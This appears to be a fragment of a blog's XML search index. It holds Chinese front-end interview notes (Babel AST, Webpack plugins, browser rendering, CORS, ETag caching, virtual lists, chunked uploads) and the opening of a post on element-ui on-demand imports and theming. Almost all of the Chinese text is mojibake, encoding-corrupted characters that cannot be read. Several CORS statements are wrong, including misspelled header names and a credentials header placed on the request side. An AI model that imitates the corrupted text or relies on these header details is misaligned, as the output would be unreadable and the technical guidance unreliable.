    <content type="text"><![CDATA[é¢ç­‹éœ–å‘†å‘†çš„ä¸­å¤§åŽ‚é¢è¯•è®°å½•åŠ 2 å¹´å‰ç«¯è–ªèµ„å¯¹æ¯”(é™„èµ å­¦ä¹ æ–¹æ³•) é¢è¯•åˆ†äº«ï¼šä¸¤å¹´å·¥ä½œç»éªŒæˆåŠŸé¢è¯•é˜¿é‡Œ P6 æ€»ç»“ å¤§åŽ‚é¢è¯•è¿‡ç¨‹å¤ç›˜(å¾®ä¿¡/é˜¿é‡Œ/å¤´æ¡,é™„ç­”æ¡ˆç¯‡) ã€ŒæŸ¥ç¼ºè¡¥æ¼ã€æˆ‘çš„ 2020 å‰ç«¯é¢è¯•ç§˜ç±ï¼Œä¸ºä½ ç§‹æ‹›ä¿é©¾æŠ¤èˆª æœ€æ–°çš„å‰ç«¯å¤§åŽ‚é¢ç»ï¼ˆè¯¦è§£ç­”æ¡ˆï¼‰ 2020 ä¸‰å…ƒåŒå­¦æ˜¥æ‹›é˜¿é‡Œæ·˜ç³»ã€é˜¿é‡Œäº‘ã€å­—èŠ‚è·³åŠ¨é¢ç» &amp; ä¸ªäººæˆé•¿ç»éªŒåˆ†äº« | æŽ˜é‡‘æŠ€æœ¯å¾æ–‡ é¢è¯•è¢«é—®é¡¹ç›®ç»éªŒä¸ç”¨æ…Œï¼ŒæŒ‰è¿™ä¸ªæ­¥éª¤å›žç­”ç»å¯¹æƒŠè‰³é¢è¯• STAR æ³•åˆ™ï¼š Situation äº‹æƒ…æ˜¯åœ¨ä»€ä¹ˆæƒ…å†µä¸‹å‘ç”Ÿï¼ŒåŸºäºŽä¸€ä¸ªæ€Žæ ·çš„èƒŒæ™¯ï¼› TASK ä½ æ˜¯å¦‚ä½•æ˜Žç¡®ä½ çš„ä»»åŠ¡çš„ï¼› Action é’ˆå¯¹è¿™æ ·çš„æƒ…å†µåˆ†æžï¼Œä½ é‡‡ç”¨äº†ä»€ä¹ˆè¡ŒåŠ¨æ–¹å¼ï¼Œå…·ä½“åšäº†å“ªäº›å·¥ä½œå†…å®¹ï¼› Result ç»“æžœæ€Žæ ·ï¼Œå¸¦æ¥ä»€ä¹ˆä»·å€¼ï¼Œåœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­ä½ å­¦åˆ°äº†ä»€ä¹ˆï¼Œæœ‰ä»€ä¹ˆæ–°çš„ä½“ä¼šã€‚ Babel parse AST çš„è¿‡ç¨‹ åœ¨è§£æž AST è¿‡ç¨‹ä¸­æœ‰è¿žä¸ªé˜¶æ®µï¼šè¯æ³•åˆ†æžå’Œè¯­æ³•åˆ†æžã€‚ è¯æ³•åˆ†æžé˜¶æ®µï¼šå­—ç¬¦ä¸²å½¢å¼çš„ä»£ç è½¬æ¢ä¸ºä»¤ç‰Œï¼ˆtokensï¼‰æµï¼Œä»¤ç‰Œç±»ä¼¼äºŽ AST ä¸­çš„èŠ‚ç‚¹ï¼› è¯­æ³•åˆ†æžé˜¶æ®µï¼šæŠŠä¸€ä¸ªä»¤ç‰Œæµè½¬åŒ–ä¸º AST å½¢å¼ï¼ŒåŒæ—¶æŠŠä»¤ç‰Œä¸­çš„ä¿¡æ¯è½¬åŒ–ä¸º AST è¡¨è¿°ç»“æž„ã€‚ Babel åœ¨å¤„ç†ä¸€ä¸ªèŠ‚ç‚¹æ—¶ï¼Œæ˜¯ä»¥è®¿é—®è€…çš„å½¢å¼èŽ·å–èŠ‚ç‚¹ä¿¡æ¯å¹¶è¿›è¡Œç›¸å…³æ“ä½œã€‚è¿™ç§æ–¹å¼æ˜¯é€šè¿‡ Vistor å¯¹è±¡æ¥å®Œæˆçš„ï¼ŒVistor å¯¹è±¡ä¸­å®šä¹‰æ¥å¯¹äºŽå„ç§èŠ‚ç‚¹çš„è®¿é—®å‡½æ•°ï¼Œè¿™æ ·å°±å¯ä»¥é’ˆå¯¹ä¸åŒçš„èŠ‚ç‚¹åšå‡ºä¸åŒçš„å¤„ç†ã€‚ Webpack æ’ä»¶é—®é¢˜ç‚¹ï¼š Compiler å’Œ Compilation ä»¥åŠå®ƒä»¬çš„åŒºåˆ«ï¼Ÿ Webpack æ˜¯é€šè¿‡ä»€ä¹ˆæ–¹å¼å®žçŽ°æ¥æ’ä»¶ä¹‹é—´çš„å…³ç³»ä»¥åŠä¿è¯å®ƒä»¬çš„æœ‰åºæ€§ï¼Ÿ å¼€å‘æ’ä»¶æ—¶éœ€è¦ä¾æ®å½“å‰é…ç½®æ˜¯å¦ä½¿ç”¨æ¥æŸä¸ªå…¶ä»–çš„æ’ä»¶è€Œåšä¸‹ä¸€æ­¥å†³å®šï¼Œå¦‚ä½•åˆ¤æ–­ Webpack å½“å‰ä½¿ç”¨æ¥å“ªäº›æ’ä»¶ï¼› å¼€å‘æ’ä»¶è¿‡ç¨‹ä¸­å€Ÿé‰´äº†å…¶ä»–æ’ä»¶çš„æ€è·¯ï¼Œæˆ‘å¯¹è¿™ä¸ªæ’ä»¶æºç çš„ç†è§£ï¼Ÿ é˜¿é‡Œå‰ç«¯æ”»åŸŽç‹®ä»¬å†™äº†ä¸€ä»½å‰ç«¯é¢è¯•é¢˜ç­”æ¡ˆï¼Œè¯·æŸ¥æ”¶ æµè§ˆå™¨åŽŸç†ä¸€æ–‡æžæ‡‚ V8 å¼•æ“Žçš„åžƒåœ¾å›žæ”¶ å›¾è§£æµè§ˆå™¨åŸºæœ¬å·¥ä½œåŽŸç† ä»Žæ•´ä½“åˆ°ç»†èŠ‚æ¦‚æ‹¬äº†æµè§ˆå™¨çš„å·¥ä½œåŽŸç†ï¼šå¤§çš„æ–¹é¢ï¼šæµè§ˆå™¨çš„å·¥ä½œç”±ç”±è¿›ç¨‹ï¼ˆProcessï¼‰å’Œçº¿ç¨‹ï¼ˆThreadï¼‰åä½œå®Œæˆã€‚ä¸€ä¸ªè¿›ç¨‹å¯èƒ½æœ‰å¤šä¸ªçº¿ç¨‹ï¼Œè¿›ç¨‹ä¸Žè¿›ç¨‹ä¹‹é—´å¯é€šè¿‡ IPC è¿›è¡Œé€šä¿¡ï¼Œæµè§ˆå™¨æ˜¯é€šè¿‡ browser process å¯¹å…¶ä»–è¿›ç¨‹ï¼ˆæ¯”å¦‚ network processã€plugin processã€render processã€GPU processï¼‰è¿›è¡Œè°ƒåº¦ã€åˆ†å·¥ã€‚å°çš„æ–¹é¢ï¼šæµè§ˆå™¨å…·ä½“æ¸²æŸ“æŸä¸ªé¡µé¢ï¼Œè¿™éƒ¨åˆ†æ˜¯ç”± render process å®Œæˆï¼ŒåŠ è½½è§£æž htmlï¼Œæž„å»º DOM æ ‘ã€‚åŠ è½½è§£æž cssï¼ŒéåŽ† DOM èŠ‚ç‚¹è®¡ç®—æ ·å¼å’Œä½ç½®ä¿¡æ¯ï¼Œæž„å»ºæˆå¸ƒå±€ï¼ˆlayoutï¼‰æ ‘ã€‚ä¸»çº¿ç¨‹ä¼šéåŽ†å¸ƒå±€æ ‘ï¼Œç”Ÿæˆç»˜åˆ¶è®°å½•ï¼Œç„¶åŽåˆ›å»ºå±‚ï¼ˆlayerï¼‰æ ‘ã€‚åˆæˆå™¨ï¼ˆcompositorï¼‰å°†æ¯å±‚åˆ†æˆå¤šä¸ªç£è´´ï¼Œæ …æ ¼çº¿ç¨‹æ …æ ¼æ¯ä¸€ä¸ªç£è´´ï¼Œæ …æ ¼å®ŒæˆåŽåˆ›å»ºåˆæˆå¸§ï¼Œç„¶åŽå‘é€ç»™ GPU æ˜¾ç¤ºã€‚passive åº”ç”¨åŽŸç†ï¼šé¡µé¢æ»šåŠ¨ï¼Œrender process é€šçŸ¥åˆæˆå™¨ç”Ÿæˆæ–°çš„å¸§ï¼Œå¦‚æžœåˆæˆå™¨å‘çŽ°æœ‰ç»‘å®šäº‹ä»¶ï¼Œä¼šé€šçŸ¥å¹¶ç­‰å¾…ä¸»çº¿ç¨‹çš„å“åº”ï¼Œæ‰åˆæˆä¸‹ä¸€å¸§ï¼Œè¿™æ ·å°±é€ æˆäº†é¡µé¢å¡é¡¿ã€‚passive å‚æ•°å°±æ˜¯ä¸ºäº†å‘Šè¯‰åˆæˆå™¨ä¸ç”¨ç­‰å¾…ï¼Œç›´æŽ¥åŽ»ç”Ÿæˆæ–°å¸§ã€‚ è®¡ç®—æœºç½‘ç»œæŸ¥ç¼ºè¡¥æ¼ã€å·©å›ºä½ çš„ HTTP çŸ¥è¯†ä½“ç³» ã€åŽŸã€‘è€ç”Ÿå¸¸è°ˆ-ä»Žè¾“å…¥ url åˆ°é¡µé¢å±•ç¤ºåˆ°åº•å‘ç”Ÿäº†ä»€ä¹ˆ ä»Ž URL è¾“å…¥åˆ°é¡µé¢å±•çŽ°åˆ°åº•å‘ç”Ÿä»€ä¹ˆï¼Ÿ é¢„æµ‹æœ€è¿‘é¢è¯•ä¼šè€ƒ Cookie çš„ SameSite å±žæ€§ è·¨åŸŸèµ„æºå…±äº« CORS è¯¦è§£ é˜®ä¸€å³°è€å¸ˆå¯¹ CORS çš„å®šä¹‰ç†è§£ CORS å®Œå…¨æ‰‹å†Šè®²è¿°å°æ˜Žæäº¤è¡¨å•çš„æ•…äº‹ï¼Œä¸€å±‚å±‚è®²è§£ CORS åœ¨çŽ°å®žåº”ç”¨å‡ºé”™çš„ä¸€äº›æƒ…æ™¯ï¼š é¦–å…ˆç”¨ fetch è·¨åŸŸè¯·æ±‚ä¼šæŠ¥é”™ mode to &#39;no-cors&#39; ï¼Œéœ€è¦åŽç«¯åŠ ä¸Š Access-Contron-Allow-Origin: origin å“åº”å¤´åˆ¶å®šæŸä¸ªæˆ–è€…æ‰€æœ‰åŸŸåï¼Œå‘Šè¯‰æµè§ˆå™¨å…è®¸çš„ originã€‚ å¦‚æžœè®¾ç½® cookieï¼Œéœ€è¦åŽç«¯å“åº”å¤´åŠ ä¸Š set-cookie å’Œ Access-Control-Allow-credential: originï¼Œå¦‚æžœå‰ç«¯çš„è¯·æ±‚éœ€è¦æºå¸¦ cookieï¼Œå‰ç«¯ä¹Ÿè®¸åŠ ä¸Šè¿™ä¸ªè¯·æ±‚å¤´ Access-Control-Allow-credential: trueã€‚ å¦‚æžœ Access-Contron-Allow-Origin: * åˆ™ä¸èƒ½æºå¸¦ cookieï¼ŒAccess-Control-Allow-credential: true ä¸èµ·ä½œç”¨ã€‚ è·¨åŸŸè¯·æ±‚åˆ†ä¸ºç®€å•è¯·æ±‚å’Œéžç®€å•è¯·æ±‚ã€‚åˆ¤æ–­æ˜¯ç®€å•è¯·æ±‚ï¼š1. method æ˜¯ GETã€HEAD æˆ– POSTï¼Œ2. æ²¡æœ‰è‡ªè®¢ headerï¼Œ3. Content-Typeæ˜¯è¿™ä¸‰ç§ï¼šapplication/x-www-form-urlencodedã€multipart/form-data å’Œ text-plainã€‚å…¶ä»–éƒ½æ˜¯éžç®€å•è¯·æ±‚ã€‚éžç®€å•è¯·æ±‚åœ¨æ­£æ˜¯è¯·æ±‚å‰éƒ½ä¼šå‘é€ä¸€ä¸ªé¢„æ£€è¯·æ±‚ï¼ˆpreflight requestï¼‰ï¼Œä¹Ÿå°±æ˜¯ method ä¸º OPTIONS è¯·æ±‚ï¼Œæµè§ˆå™¨ä¼šåŠ ä¸Šä¸¤ä¸ª headerï¼šAccess-Control-Request-Headers å’Œ Access-Control-Request-Methodï¼Œå‘Šè¯‰æœåŠ¡å™¨æ­£å¼è¯·æ±‚çš„è¯·æ±‚å¤´å’Œè¯·æ±‚æ–¹æ³•ï¼ŒåŽç«¯éœ€è¦è¿”å›žå“åº”å¤´ Access-Control-Allow-Headers è®©æµè§ˆå™¨é€šè¿‡é¢„æ£€ï¼Œæµè§ˆå™¨æ‰ä¼šå‘é€æ­£å¼è¯·æ±‚ã€‚ Access-Control-max-age: second å¯ä»¥åœ¨ second ç§’å†…ä¸é’ˆå¯¹æ¯ä¸ªè¯·æ±‚è¿›è¡Œé¢„æ£€ï¼Œå‡å°‘èµ„æºæµªè´¹ã€‚ è‹¥æƒ³æ¸ é“è‡ªè®¢ header ï¼Œéœ€è¦åŽç«¯çš„å“åº”å¤´è®¾ç½® Access-Control-Expose-Headers: self-header,other-header æŒ‡å®šã€‚ ç¼“å­˜æµ…è§£å¼ºç¼“å­˜å’Œåå•†ç¼“å­˜ HTTP ä¸­çš„ ETag æ˜¯å¦‚ä½•ç”Ÿæˆçš„ï¼Ÿ åœ¨ HTTP ç¼“å­˜ä¸­åå•†ç¼“å­˜æœ‰ä¸€ç§æ˜¯ ETagï¼Œå®ƒå¯ä»¥çœ‹æˆæ˜¯èµ„æºçš„æŒ‡çº¹ï¼Œèµ„æºå‘ç”Ÿæ”¹å˜å°±ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„ ETagã€‚Etag:W/&quot;&lt;etag_value&gt;&quot; \Wï¼ˆå¤§å°å†™æ•æ„Ÿï¼‰è¡¨ç¤ºä½¿ç”¨å¼±éªŒè¯å™¨ï¼Œå®¹æ˜“ç”Ÿæˆï¼Œä¸åˆ©äºŽæ¯”è¾ƒã€‚ç›¸åï¼Œå¼ºéªŒè¯å™¨éš¾ç”Ÿæˆã€‚æ²¡æœ‰æ˜Žç¡®æŒ‡å®šç”Ÿæˆ ETag å€¼çš„æ–¹æ³•ï¼Œé€šå¸¸ä½¿ç”¨å†…å®¹çš„æ•£åˆ—ã€æœ€åŽä¿®æ”¹æ—¶é—´æˆ³çš„å“ˆå¸Œå€¼æˆ–è€…ç®€å•åœ°ä½¿ç”¨ç‰ˆæœ¬å·ã€‚æœ¬åœ°å¼ºç¼“å­˜è¿‡æœŸåŽï¼Œè¯¢é—®åå•†ç¼“å­˜ï¼Œè¯·æ±‚æŠ¥æ–‡ If-None-Match: &quot;xx-xxxx&quot;ï¼Œå†…å®¹æ²¡æœ‰å‘ç”Ÿæ”¹å˜ï¼Œå“åº”æŠ¥æ–‡ ETag: &quot;xx-xxxx&quot;ã€‚ Last-Modified å’Œ ETag æ¯”è¾ƒï¼š ç²¾åº¦ä¸Šï¼ŒETag è¦ä¼˜äºŽ Last-Modifiedã€‚Last-Modified çš„æ—¶é—´å•ä½æ˜¯ç§’ï¼Œå¦‚æžœæŸä¸ªæ–‡ä»¶åœ¨ 1 ç§’è¢«æ”¹å˜å¤šæ¬¡ï¼Œé‚£ä¹ˆå®ƒä»¬çš„ Last-Modified å¹¶æ²¡æœ‰ä½“çŽ°å‡ºæ¥ä¿®æ”¹ï¼Œä½†æ˜¯ ETag æ¯æ¬¡éƒ½ä¼šæ”¹å˜ï¼Œä»Žè€Œç¡®ä¿äº†ç²¾åº¦ï¼›æ­¤å¤–ï¼Œå¦‚æžœæ˜¯è´Ÿè½½å‡è¡¡æœåŠ¡å™¨ï¼Œå„ä¸ªæœåŠ¡ç”Ÿæˆçš„ Last-Modified ä¹Ÿå¯èƒ½ä¸ä¸€è‡´ã€‚ æ€§èƒ½ä¸Šï¼ŒETag è¦é€ŠäºŽ Last-Modifiedï¼Œæ¯•ç«Ÿ Last-Modified åªéœ€è¦è®°å½•æ—¶é—´ï¼Œè€Œ ETag éœ€è¦æœåŠ¡å™¨é€šè¿‡æ¶ˆæ¯æ‘˜è¦ç®—æ³•è®¡ç®—å‡ºä¸€ä¸ª hash å€¼ã€‚ ä¼˜å…ˆçº§ä¸Šï¼Œåœ¨èµ„æºæ–°é²œåº¦æ ¡éªŒæ—¶ï¼ŒæœåŠ¡å™¨ä¼šä¼˜å…ˆè€ƒè™‘ ETagã€‚å³å¦‚æžœæ¡ä»¶è¯·æ±‚çš„è¯·æ±‚é€ä½ åŒæ—¶æºå¸¦ If-Modified-Since å’Œ If-None-Match å­—æ®µï¼Œä¼šä¼˜å…ˆåˆ¤æ–­èµ„æºçš„ ETag å€¼æ˜¯å¦å‘ç”Ÿå˜åŒ–ã€‚ æ€§èƒ½ä¼˜åŒ–å‰ç«¯æ€§èƒ½ä¼˜åŒ– 24 æ¡å»ºè®®ï¼ˆ2020ï¼‰ å‰ç«¯è™šæ‹Ÿåˆ—è¡¨å®žçŽ°åŽŸç† å®žçŽ°å‰æï¼Œåˆ—è¡¨å®¹å™¨å®šé«˜ï¼Œå®¹å™¨å†…æœ‰ä¸€ä¸ªå½±å­å®¹å™¨ï¼Œé«˜åº¦ä¸ºç®—å‡ºçš„å®žé™…å†…å®¹é«˜åº¦ï¼Œè¿™æ ·å°±æœ‰çœŸå®žçš„æ»šåŠ¨æ¡åŠæ»šåŠ¨æ•ˆæžœã€‚è€ŒçœŸå®žå±•ç¤ºç»™ç”¨æˆ·è§†çª—ä¸­çš„æ˜¯ç»å¯¹å®šä½çš„å…ƒç´ æž„æˆçš„çœŸå®žå®¹å™¨ï¼Œå½±å­å®¹å™¨æ»šåŠ¨ï¼ŒçœŸå®žå®¹å™¨ä¹Ÿè·Ÿç€æ»šåŠ¨ï¼Œç›‘å¬å½±å­å®¹å™¨çš„ onscroll äº‹ä»¶ï¼ŒèŽ·å–å½±å­å®¹å™¨çš„ scrollTopï¼Œç®—å‡ºè§†çª—ä¸­ç¬¬ä¸€é¡¹æ¸²æŸ“çš„æ•°æ®ç´¢å¼• startIndex æœ‰æ²¡æœ‰æ›´æ–°ï¼Œæœ‰ï¼Œåˆ™é‡æ–°æˆªå–åˆ—è¡¨æ•°æ®æ¸²æŸ“å¯è§†åŒºã€‚è™½ç„¶è¯´æ˜¯é‡æ–°æ¸²æŸ“ï¼Œä½†æ˜¯ä¸‹ä¸€å¸§å’Œå½“å‰æ»šåŠ¨ä½ç½®å…ƒç´ ä¸€æ ·ï¼Œæ‰€ä»¥ç”¨æˆ·æ— æ„ŸçŸ¥ã€‚ ç¡®å®šå½±å­å®¹å™¨çš„é«˜åº¦ï¼š åˆ—è¡¨å†…å®¹æ¯ä¸€é¡¹å®šé«˜ï¼Œå½±å­å®¹å™¨çš„é«˜åº¦=æ¯ä¸€é¡¹å®šé«˜ x total åˆ—è¡¨å†…å®¹æ¯ä¸€é¡¹ä¸å®šé«˜ï¼Œå¯ä»¥åˆå§‹å‡è®¾æ¯ä¸€é¡¹å®šé«˜ï¼Œç®—å‡ºå½±å­å®¹å™¨é«˜åº¦ï¼Œè¿™æ ·å®¹å™¨å¯æ»šåŠ¨ï¼Œå¾…çœŸå®žå®¹å™¨æ¸²æŸ“åŽï¼Œç®—å‡ºæ¯ä¸€é¡¹å…ƒç´ çš„é«˜åº¦ã€ä½ç½®ä¿¡æ¯ï¼Œå†åŽ»æ›´æ–°å½±å­å®¹å™¨é«˜åº¦ã€‚ç®—å‡ºäº†å½±å­å®¹å™¨çš„é«˜åº¦åŠå…¶æ¯ä¸€é¡¹çš„ä½ç½®ä¿¡æ¯ï¼Œåˆå·²çŸ¥ scrollTopï¼Œå¯ä»¥é€šè¿‡äºŒåˆ†æ³•æ‰¾åˆ°å½“å‰çš„ startIndexã€‚ react åŽŸç†ä»Žé›¶å¼€å§‹å®žçŽ°ä¸€ä¸ª ReactVuexã€Fluxã€Reduxã€Redux-sagaã€Dvaã€MobX HTML5ç§æ–‡ä»¶ä¸Šä¼ æ”»ç•¥å®žçŽ°ä¸€ä¸ªå¤§æ–‡ä»¶ä¸Šä¼ å’Œæ–­ç‚¹ç»­ä¼  æ–‡ä»¶åˆ†ç‰‡ åˆ©ç”¨ Blob åŽŸç”Ÿæ–¹æ³• Blob.prototype.slice åˆ‡å‰²æ–‡ä»¶ï¼Œæ¯ä¸ªåˆ‡ç‰‡å¹¶è¡Œä¸Šä¼ ï¼ŒæœåŠ¡ç«¯åˆ›å»ºä¸´æ—¶ç›®å½•å­˜å‚¨ä¸Šä¼ åˆ†ç‰‡ï¼Œå‰ç«¯ä¸Šä¼ å®Œæ¯•ï¼ŒæœåŠ¡ç«¯åˆ©ç”¨ createWriteStream åˆ›å»ºå¯å†™æµï¼Œå°†åˆ‡ç‰‡æ•´åˆæˆä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åŽåˆ é™¤ä¸´æ—¶åˆ†ç‰‡çš„ä¸´æ—¶æ–‡ä»¶ã€‚ æ–­ç‚¹ç»­ä¼  å‰ç«¯è®°å½•å½“å‰ä¸Šä¼ çš„åˆ†ç‰‡ä¿¡æ¯åˆ° localStorageï¼Œä¸‹æ¬¡ç»­ä¼ é‡æ–°è¯»å–ï¼Œä¸è¿‡è¿™ç§æ–¹å¼çš„å‰ææ˜¯ä¸æ¢æµè§ˆå™¨å’Œæ›´æ”¹æ–‡ä»¶åã€‚ä¸¥æ ¼çš„è§£å†³æ–¹æ¡ˆæ˜¯æŒ‰ç…§æ–‡ä»¶å†…å®¹ç”Ÿæˆ hash å€¼æ ‡å¿—ä½œä¸ºæ–‡ä»¶åï¼šç”¨ spark-md5 å¯ä»¥å®žçŽ°ï¼Œä¸è¿‡å½“è¯»å–çš„æ–‡ä»¶å†…å®¹ç‰¹åˆ«å¤§æ—¶ï¼Œä¼šå‡ºçŽ°â€œå‡æ­»â€œï¼Œè§£å†³æ–¹æ¡ˆå¯ä»¥åœ¨ webWorker çº¿ç¨‹ä¸­è®¡ç®—ã€‚ æ–‡ä»¶ç§’ä¼  æœåŠ¡ç«¯å·²ç»å­˜åœ¨äº†ä¸Šä¼ çš„èµ„æºï¼Œå½“å†æ¬¡ä¸Šä¼ æ—¶ç›´æŽ¥æç¤ºä¸Šä¼ æˆåŠŸ å·¥ç¨‹åŒ–@babel/plugin-transform-runtime åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿå…³äºŽ Babel é‚£äº›äº‹å„¿ä¸å®¹é”™è¿‡çš„ Babel7 çŸ¥è¯† Babel æ˜¯å°† ES6+ç‰ˆæœ¬çš„ä»£ç è½¬æ¢ä¸ºå‘åŽå…¼å®¹çš„ JavaScript è¯­æ³•ï¼Œä»¥ä¾¿èƒ½è¿è¡Œåœ¨å½“å‰å’Œæ—§ç‰ˆæœ¬çš„æµè§ˆå™¨æˆ–å…¶ä»–çŽ¯å¢ƒä¸­ã€‚ Babel åªè´Ÿè´£ç¼–è¯‘æ–°æ ‡å‡†å¼•å…¥çš„æ–°è¯­æ³•ï¼Œæ¯”å¦‚ Arrow functionã€Classã€ES Module ç­‰ï¼Œå®ƒä¸ä¼šç¼–è¯‘åŽŸç”Ÿå¯¹è±¡æ–°å¼•å…¥çš„æ–¹æ³•å’Œ APIï¼Œæ¯”å¦‚ Array.includesï¼ŒArray.fromï¼ŒObject.assignï¼ŒMapï¼ŒSet ç­‰ï¼Œè¿™äº›éœ€è¦é€šè¿‡ Polyfill æ¥è§£å†³ã€‚ preset é¢„è®¾æ˜¯æ’ä»¶ plugins çš„é›†åˆï¼Œé¢„è®¾æ•°ç»„åŠ è½½çš„é¡ºåºæ˜¯ä»Žä»Žå³åˆ°å·¦ï¼Œä¸ºäº†å‘åŽå…¼å®¹ï¼Œä¸€èˆ¬ç”¨æˆ·ä¼šæŠŠ prest-es2015 å†™åœ¨ stage-0 çš„å‰é¢ã€‚ @babel/preset-env å¯ä»¥æ ¹æ®é…ç½®çš„ç›®æ ‡çŽ¯å¢ƒï¼ˆbrowserlistï¼‰ï¼Œç”Ÿæˆæ’ä»¶åˆ—è¡¨æ¥ç¼–è¯‘ï¼Œè®¾ç½®å‚æ•° useBuiltIns: â€œusageâ€ å¯ä»¥æŒ‰ç…§ç”¨æˆ·ä½¿ç”¨ ES6 API ç›¸åº”å¼•å…¥ Polyfillã€‚ @babel/plugin-transform-runtime å¯ä»¥è®© Babel åœ¨ç¼–è¯‘ä¸­å…·åå¼•å…¥ @babel/runtime æ¨¡å—å¤ç”¨è¾…åŠ©å‡½æ•°ï¼Œä»Žè€Œå‡å°æ‰“åŒ…æ–‡ä»¶ä½“ç§¯ ã€‚ @babel/plugin-transform-runtime é€šå¸¸ä»…åœ¨å¼€å‘æ—¶ä½¿ç”¨ï¼Œä½†æ˜¯è¿è¡Œæ—¶æœ€ç»ˆä»£ç éœ€è¦ä¾èµ– @babel/runtimeã€‚ ç›´æŽ¥ä½¿ç”¨ @babel/runtime ä¼šè½¬æ¢åŽŸåž‹æ–¹æ³•ï¼Œæ±¡æŸ“å…¨å±€çŽ¯å¢ƒï¼Œå¯ä»¥ä½¿ç”¨ @babel/plugin-transform-runtime é…åˆ corejs3 å¯ä»¥å¤„ç†è¾…åŠ©å‡½æ•°é‡å¤é—®é¢˜ï¼Œè¿˜å¯ä»¥åŠ è½½ polyfillï¼Œä¸æ±¡æŸ“å…¨å±€çŽ¯å¢ƒã€‚ V7.4.0 å·²ç»è¢«åºŸå¼ƒï¼Œéœ€è¦å•ç‹¬å®‰è£… core-js å’Œ regenerator-runtime æ¨¡å—ã€‚ å˜¿ï¼Œä¸è¦ç»™ async å‡½æ•°å†™é‚£ä¹ˆå¤š try/catch äº† Webpack æ’ä»¶å¼€å‘å¦‚æ­¤ç®€å•ï¼ ä¸€ä¸ª Webpack æ’ä»¶çš„æž„æˆï¼š ä¸€ä¸ªå…·å JavaScript å‡½æ•°ï¼› åœ¨å®ƒçš„åŽŸåž‹ä¸Šå®šä¹‰ apply æ–¹æ³•ï¼› æŒ‡å®šä¸€ä¸ªè§¦åŠåˆ° webpack æœ¬èº«çš„äº‹ä»¶é’©å­ï¼› æ“ä½œ webpack å†…éƒ¨çš„å®žä¾‹ç‰¹å®šæ•°æ®ï¼› åœ¨å®žçŽ°åŠŸèƒ½åŽè°ƒç”¨ webpack æä¾›çš„ callbackã€‚ ã€ç¼–è¯‘ç¯‡ã€‘AST å®žçŽ°å‡½æ•°é”™è¯¯çš„è‡ªåŠ¨ä¸ŠæŠ¥å®žçŽ°å…¨å±€æ•°æ®ä¸ŠæŠ¥ä¸­ try catch åœ¨ babel ç¼–è¯‘å±‚é¢ä¸Šçš„æ‹¦æˆª å¾®å‰ç«¯ç©¶ç«Ÿæ˜¯ä»€ä¹ˆï¼Œå¯ä»¥å¸¦æ¥ä»€ä¹ˆæ”¶ç›Š å¾®å‰ç«¯æ¦‚å¿µæ˜¯ä»Žå¾®æœåŠ¡æ¦‚å¿µæ‰©å±•è€Œæ¥çš„ï¼Œæ‘’å¼ƒå¤§åž‹å•ä½“æ–¹å¼ï¼Œå°†å‰ç«¯æ•´ä½“åˆ†è§£ä¸ºå°è€Œç®€å•çš„å—ï¼Œè¿™äº›å—å¯ä»¥ç‹¬ç«‹å¼€å‘ã€æµ‹è¯•å’Œéƒ¨ç½²ï¼ŒåŒæ—¶ä»ç„¶èšåˆä¸ºä¸€ä¸ªäº§å“å‡ºçŽ°åœ¨å®¢æˆ·é¢å‰ã€‚å¯ä»¥ç†è§£å¾®å‰ç«¯æ˜¯ä¸€ç§å°†å¤šä¸ªå¯ç‹¬ç«‹äº¤ä»˜çš„å°åž‹å‰ç«¯åº”ç”¨èšåˆä¸ºä¸€ä¸ªæ•´ä½“çš„æž¶æž„é£Žæ ¼ã€‚ DevOps åˆ°åº•æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ ä»Žç€‘å¸ƒå¼å¼€å‘ã€æ•æ·å¼€å‘åˆ°å¦‚ä»Šçš„ DevOps å¼€å‘ã€‚DevOps æ˜¯ä¸€ç»„è¿‡ç¨‹ã€æ–¹æ³•ä¸Žç³»ç»Ÿçš„ç»Ÿç§°ï¼Œç”¨äºŽä¿ƒè¿›å¼€å‘ã€æŠ€æœ¯è¿è¥å’Œè´¨é‡ä¿è¯éƒ¨é—¨ä¹‹é—´çš„æ²Ÿé€šã€åä½œä¸Žæ•´åˆã€‚æœ€ç»ˆå°†å¼€å‘ã€æµ‹è¯•è¿ç»´ç´§å¯†è”ç³»åœ¨ä¸€èµ·ã€‚ js åŽŸç†å®žçŽ°JavaScript ä¸“é¢˜ä¹‹è·Ÿç€ underscore å­¦é˜²æŠ–]]></content>
      <tags>
        <tag>interview</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å½»åº•å­¦ä¼šelement-uiæŒ‰éœ€å¼•å…¥å’Œçº¯å‡€ä¸»é¢˜å®šåˆ¶]]></title>
    <url>%2F2020%2F10%2F12%2Felement-replace-theme%2F</url>
    <content type="text"><![CDATA[å‰è¨€æ‰‹ä¸Šæœ‰äº›é¡¹ç›®ç”¨çš„element-uiï¼Œåˆšå¥½æœ‰ç©ºç¢ç£¨ä¸€ä¸‹æ€Žä¹ˆå‡å°æ‰“åŒ…æ–‡ä»¶å¤§å°å’Œæ‰“åŒ…é€Ÿåº¦æ–¹é¢ï¼Œä¸ºäº†æ¼”ç¤ºå®žéªŒï¼Œç”¨ vue-cli ç”Ÿæˆåˆå§‹é¡¹ç›®ï¼Œåœ¨è¿™ä»…å¯¹ element-ui ä¸»é¢˜å’Œç»„ä»¶æ–¹é¢æ¥ä¼˜åŒ–ã€‚ 1vue init webpack vuecli å®Œæ•´å¼•å…¥å®Œæ•´åœ°å°† ui å’Œæ ·å¼å¼•å…¥ã€‚ 12import ElementUI from 'element-ui'import 'element-ui/lib/theme-chalk/index.css' åœ¨é¡µé¢ç®€å•ä½¿ç”¨ 2 ä¸ªç»„ä»¶ï¼Œçœ‹çœ‹æ•ˆæžœã€‚ 12345678910111213&lt;el-tabs v-model="activeName" @tab-click="handleClick"&gt; &lt;el-tab-pane label="ç”¨æˆ·ç®¡ç†" name="first"&gt;ç”¨æˆ·ç®¡ç†&lt;/el-tab-pane&gt; &lt;el-tab-pane label="é…ç½®ç®¡ç†" name="second"&gt;é…ç½®ç®¡ç†&lt;/el-tab-pane&gt; &lt;el-tab-pane label="è§’è‰²ç®¡ç†" name="third"&gt;è§’è‰²ç®¡ç†&lt;/el-tab-pane&gt; &lt;el-tab-pane label="å®šæ—¶ä»»åŠ¡è¡¥å¿" 